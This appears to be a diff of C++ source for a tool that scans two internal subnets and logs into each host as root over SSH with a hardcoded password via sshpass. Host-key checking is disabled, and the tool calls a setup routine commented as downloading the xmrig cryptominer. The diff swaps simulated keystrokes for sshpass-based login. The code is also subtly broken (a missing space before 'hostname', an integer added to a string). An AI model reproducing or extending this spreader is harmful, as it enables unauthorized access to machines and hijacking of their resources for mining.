@@ -2,13 +2,13 @@
 #include <iostream>
 #include <string>
 #include <unistd.h>
-#include <X11/keysym.h>
-#include <X11/extensions/XTest.h>
+//#include <X11/keysym.h>
+//#include <X11/extensions/XTest.h>
 #include <memory>
 #include <fstream>
 #include <vector>
 #include <array>
-
+/*
 void emulate_keyboard(std::string inp){
 	Display *display;
 	display = XOpenDisplay(NULL);
@@ -24,7 +24,7 @@ void emulate_keyboard(std::string inp){
 	XTestFakeKeyEvent(display, keycode, False, 0);
 	XFlush(display);
 	XCloseDisplay(display);
-}
+}*/
 
 std::string exec(const char* cmd) {
     std::array<char, 128> buffer;
@@ -40,7 +40,7 @@ std::string exec(const char* cmd) {
 
     return result;
 }
-
+/*
 bool check_connection(std::string inp){
 	std::string word = "";
 	for(int i = 0; i < inp.size(); ++i){
@@ -55,7 +55,7 @@ bool check_connection(std::string inp){
 		}
 	}
 	return 0;
-}
+}*/
 
 void setup(){
 	//ur func to setup worker and download xmrig
@@ -104,25 +104,18 @@ int main(int argc, char* argv[]){
 	}
 	
 	std::string arg = argv[1];
-
+  	// "sshpass -p 1347QwAsZx ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.213.120 'hostname' "
 	if(arg == "scan"){
 		for(int i = 2; i < 256; ++i){
 			//checking for 112
-			ip = "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.212." + std::to_string(i); //ip
-			if(check_connection(exec(ip.c_str()))){ 
-				emulate_keyboard("1347QwAsZx"); //entering password
-				hosts.push_back(exec("hostname") + " " + std::to_string(i)); //to ip data base
-				setup(); // ur func
-				system("exit");
-			}
+			ip = "sshpass -p 1347QwAsZx ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.212." + std::to_string(i) + "hostname"; //ip
+			hosts.push_back(system(ip.c_str()) + " " + std::to_string(i)); //to ip data base
+			setup(); // ur func
+			
 			//checking for 113
-			ip = "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2 root@172.17.213." + std::to_string(i); //ip
-			if(check_connection(exec(ip.c_str()))){
-				emulate_keyboard("1347QwAsZx"); //entering password
-				hosts.push_back(exec("hostname") + " " + std::to_string(i)); //to ip data base
-				setup(); // ur func
-				system("exit");
-			}
+			ip = "sshpass -p 1347QwAsZx ssh -o StrictHostKeyChecking=no -o ConnectTimeout=2  root@172.17.213." + std::to_string(i) + "hostname"; //ip
+			hosts.push_back(system(ip.c_str()) + " " + std::to_string(i)); //to ip data base
+			setup(); // ur func
 		}
 
 		std::ofstream out("hosts.txt", std::ios::out); //open file to rewrite all data
@@ -134,7 +127,7 @@ int main(int argc, char* argv[]){
 	else if(arg == "connect"){
 		std::string host = argv[1];
 		connect(host);
+
 	}
-	
 	return 0xABCDEF;
 }
